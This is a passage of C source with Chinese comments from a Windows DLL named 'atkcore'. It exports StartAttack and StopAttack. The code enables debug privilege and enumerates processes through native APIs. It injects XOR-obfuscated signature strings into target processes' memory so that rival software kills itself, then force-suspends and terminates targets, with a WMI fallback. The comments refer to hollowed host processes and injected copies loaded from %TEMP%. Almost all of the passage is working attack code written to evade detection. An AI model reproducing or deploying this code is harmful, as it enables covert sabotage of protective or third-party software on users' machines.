   `xxres.bin` 三个串，命中就 TerminateProcess。那就把这些串**写进 yy 进程自己的私有内存**：
   yy 扫到（自己或同伴）就自杀，比我们主动结束更省事、也更难被反制。
   关键：本文件里**不能有明文**（否则 atkcore 自己带着特征），所以用 XOR 密文 + 运行时解码，
   写入远端后立刻把本地缓冲清零。 */
static const unsigned char kSigTitleEnc[] = {
    0xFF,0xFF,0x87,0xF7,0xF5,0xE8,0xE0,0xF5,0xE6,0xEA,0x87,0x8A,0x87,0xE6,0xEB,0xEE,0xF1,0xE2
};
static const unsigned char kSigMutexEnc[] = { 0xDF,0xDF,0xF8,0xD0,0xC0,0xF8 };
static const unsigned char kSigBackupEnc[] = { 0xDF,0xDF,0xD5,0xC2,0xD4,0x89,0xC5,0xCE,0xC9 };

static void XorDecode(unsigned char *dst, const unsigned char *enc, int n)
{
    int i;
    for (i = 0; i < n; i++) dst[i] = (unsigned char)(enc[i] ^ 0xA7);
    dst[n] = 0;
}

/* 往一个目标进程里种一遍（每次新建一页私有内存，避免被它自己回收后失效） */
static BOOL PlantSignaturesInPid(DWORD pid)
{
    HANDLE hProc;
    unsigned char page[0x400];
    LPVOID remote;
    BOOL ok = FALSE;

    hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                        FALSE, pid);
    if (!hProc) return FALSE;

    memset(page, 0, sizeof(page));
    XorDecode(page + 0x000, kSigTitleEnc,  sizeof(kSigTitleEnc));
    XorDecode(page + 0x100, kSigMutexEnc,  sizeof(kSigMutexEnc));
    XorDecode(page + 0x200, kSigBackupEnc, sizeof(kSigBackupEnc));

    remote = VirtualAllocEx(hProc, NULL, sizeof(page), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remote) {
        SIZE_T wrote = 0;
        ok = WriteProcessMemory(hProc, remote, page, sizeof(page), &wrote) && wrote == sizeof(page);
        if (ok) {
            /* 加一层：把同一页的保护改成可读（PAGE_READWRITE 已经可读，这里只是显式化） */
            DWORD old = 0;
            VirtualProtectEx(hProc, remote, sizeof(page), PAGE_READWRITE, &old);
        }
    }
    SecureZeroMemory(page, sizeof(page));      /* 本地副本立刻抹掉，别留特征 */
    CloseHandle(hProc);
    return ok;
}

/* 遍历目标进程，逐个种特征（3 秒一轮，节流；只在拿到 leader 的那份实现里跑） */
static void PlantSignaturesInAllTargets(void)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    int planted = 0;

    if (hSnap == INVALID_HANDLE_VALUE) return;
    memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (!IsTargetName(pe.szExeFile)) continue;
            if (pe.th32ProcessID == GetCurrentProcessId()) continue;
        if (IsHollowPid(pe.th32ProcessID)) continue;   /* 我方宿主化进程：不许杀 */
            if (PlantSignaturesInPid(pe.th32ProcessID)) {
                planted++;
                WriteKillLog(L"已把特征串种进目标私有内存 PID=%lu %ls（yy 自扫自灭）",
                             pe.th32ProcessID, pe.szExeFile);
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    if (planted)
        WriteKillLog(L"本轮共向 %d 个目标进程植入特征串", planted);
}
static DWORD WINAPI AttackLoop(LPVOID lp);
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void LockImage(LPCWSTR path);
static void MaintainLocks(void);

/* 取真正的程序目录：注入副本是从 %TEMP% 的改名文件加载的，按自身模块路径
   会推到 %TEMP%，payload.dll / payload.bin 就都找不到了。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch)
{
    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        XXDirNameOf(XXPathBase(g_pSharedView, NULL), dir, cch);
        if (dir[0] != L'\0') return;
    }
    GetModuleFileNameW(g_hSelfModule ? g_hSelfModule : GetModuleHandleW(L"atkcore.dll"),
                       dir, (DWORD)cch);
    {
        WCHAR *pSlash = wcsrchr(dir, L'\\');
        if (pSlash) pSlash[1] = L'\0';
    }
}

/* 获取 payload.dll 路径（与 xx.exe 同目录） */
static void GetKillerPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.dll");
}

/* 获取 payload.bin 路径 */
static void GetKillerBinPath(WCHAR *buf, SIZE_T size)
{
    GetOwnDir(buf, size);
    wcscat_s(buf, size, L"payload.bin");
}

/* ================== 调试特权（新约定允许 SeDebugPrivilege） ================== */
static BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    BOOL ok = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        SetLastError(ERROR_SUCCESS);
        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
            GetLastError() != ERROR_NOT_ALL_ASSIGNED)
            ok = TRUE;
    }
    CloseHandle(hToken);
    return ok;
}

/* 导出：启动攻击 */
__declspec(dllexport) void WINAPI StartAttack(void)
{
    if (InterlockedCompareExchange(&g_bRunning, 1, 0) == 0)
    {
        BOOL bPriv = EnableDebugPrivilege();
        WriteKillLog(L"atkcore build=%ls 启动 PID=%lu SeDebug=%s（本行用于确认加载的是新 dll）",
                     L"v5 (kill-on-sight)", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
        g_hThread = CreateThread(NULL, 0, AttackLoop, NULL, 0, NULL);
    }
}

/* 导出：停止攻击 */
__declspec(dllexport) void WINAPI StopAttack(void)
{
    InterlockedExchange(&g_bRunning, 0);
    if (g_hThread)
    {
        WaitForSingleObject(g_hThread, 5000);
        CloseHandle(g_hThread);
        g_hThread = NULL;
        WriteKillLog(L"攻击线程停止");
    }
}

/* 方法1：TerminateProcess */
/* ================== B1/B3：一次 syscall 枚举 + 挂起式击杀 ==================
   "枚举有点慢"的根因：每轮都 CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)，
   那是内核把手，要把几十万字节的进程表复制两遍。改成
   NtQuerySystemInformation(SystemProcessInformation)：**一次 syscall 拿全部进程**。
   击杀用 NtSuspendProcess（先冻住，VEH/守护线程反应不过来）再 TerminateProcess。 */
typedef LONG (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *NtSuspendProcess_t)(HANDLE);
typedef LONG (NTAPI *NtTerminateProcess_t)(HANDLE, LONG);

#define XX_SYSTEM_PROCESS_INFORMATION 5
#define XX_MAX_PIDS 512

/* 自己定义 UNICODE_STRING，别依赖 winternl.h */
typedef struct _XX_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} XX_UNICODE_STRING;

typedef struct _XX_SPI_ENTRY {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    UCHAR Reserved1[48];
    XX_UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
} XX_SPI_ENTRY;

static int XXEnumProcessesFast(DWORD *pids, WCHAR (*names)[64], int maxPids)
{
    static NtQuerySystemInformation_t s_pQuery = NULL;
    static BOOL s_bTried = FALSE;
    ULONG size = 1 << 20, needed = 0;
    BYTE *buf;
    LONG st;
    int n = 0;

    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"ntdll.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"ntdll.dll");
        if (h) s_pQuery = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");
    }
    if (!s_pQuery || !pids || maxPids <= 0) return 0;

    buf = (BYTE *)malloc(size);
    if (!buf) return 0;
    for (;;) {
        st = s_pQuery(XX_SYSTEM_PROCESS_INFORMATION, buf, size, &needed);
        if (st == 0) break;
        free(buf);
        if (st != (LONG)0xC0000004L && st != (LONG)0x80000005L) return 0;
        size = needed ? needed + (64 << 10) : size * 2;
        if (size > (64u << 20)) return 0;
        buf = (BYTE *)malloc(size);
        if (!buf) return 0;
    }

    {
        BYTE *p = buf;
        for (;;) {
            XX_SPI_ENTRY *e = (XX_SPI_ENTRY *)p;
            DWORD pid = (DWORD)(ULONG_PTR)e->UniqueProcessId;
            if (pid && n < maxPids) {
                pids[n] = pid;
                if (names) {
                    names[n][0] = L'\0';
                    if (e->ImageName.Buffer && e->ImageName.Length > 0) {
                        int cch = e->ImageName.Length / (int)sizeof(WCHAR);
                        if (cch > 63) cch = 63;
                        memcpy(names[n], e->ImageName.Buffer, cch * sizeof(WCHAR));
                        names[n][cch] = L'\0';
                    }
                }
                n++;
            }
            if (e->NextEntryOffset == 0) break;
            p += e->NextEntryOffset;
        }
    }
    free(buf);
    return n;
}

/* 挂起 + 终止（B3）。先冻住再杀：对手的 VEH/守护线程来不及反应。
   **不再缓存句柄**：日志里"KillFast 成功 PID=6116"刷了 54 次，而 6116 就是写日志的
   进程自己 —— 缓存句柄一旦在别处被关掉，句柄值会被系统复用，下一次 TerminateProcess
   就打到**别的进程**（甚至自己）身上。每轮 OpenProcess 的成本远小于杀错一个进程。 */
static BOOL KillFast(DWORD pid)
{
    static NtSuspendProcess_t s_pSuspend = NULL;
    static NtTerminateProcess_t s_pTerminate = NULL;
    static BOOL s_bTried = FALSE;
    HANDLE hProc;
    BOOL ok = FALSE;

    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"ntdll.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"ntdll.dll");
        if (h) {
            s_pSuspend = (NtSuspendProcess_t)GetProcAddress(h, "NtSuspendProcess");
            s_pTerminate = (NtTerminateProcess_t)GetProcAddress(h, "NtTerminateProcess");
        }
    }
    if (!pid || pid <= 4 || pid == GetCurrentProcessId()) return FALSE;
    if (IsHollowPid(pid)) return TRUE;                 /* 宿主化进程：当成已处理，别动它 */

    hProc = OpenProcess(PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME | SYNCHRONIZE, FALSE, pid);
    if (!hProc)
        hProc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pid);
    if (!hProc) {
        WriteKillLog(L"KillFast 打不开 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    if (s_pSuspend) s_pSuspend(hProc);
    if (s_pTerminate) ok = (s_pTerminate(hProc, 0) == 0);
    else ok = TerminateProcess(hProc, 0);
    if (!ok) ok = TerminateProcess(hProc, 0);

    /* **必须等它真的退出**：日志里出现过"KillFast 成功"对同一个 PID 刷几十次，
       进程却还活着（TerminateProcess 是异步的，且目标被挂起后退出更慢）。
       不确认就报成功 = 自己骗自己，等于"看起来杀了、其实没杀"。 */
    if (ok) {
        DWORD w = WaitForSingleObject(hProc, 300);
        if (w == WAIT_OBJECT_0) {
            WriteKillLog(L"KillFast 成功（已确认退出）PID=%lu", pid);
        } else {
            WriteKillLog(L"KillFast 已下发但进程仍在 PID=%lu（等 300ms 超时）", pid);
            ok = FALSE;
        }
    } else {
        DWORD err = GetLastError();
        WriteKillLog(L"KillFast 失败 PID=%lu err=%lu -> 走 WMI 兜底", pid, err);
        CloseHandle(hProc);
        return KillViaWmi(pid);
    }
    CloseHandle(hProc);
    return ok;
}

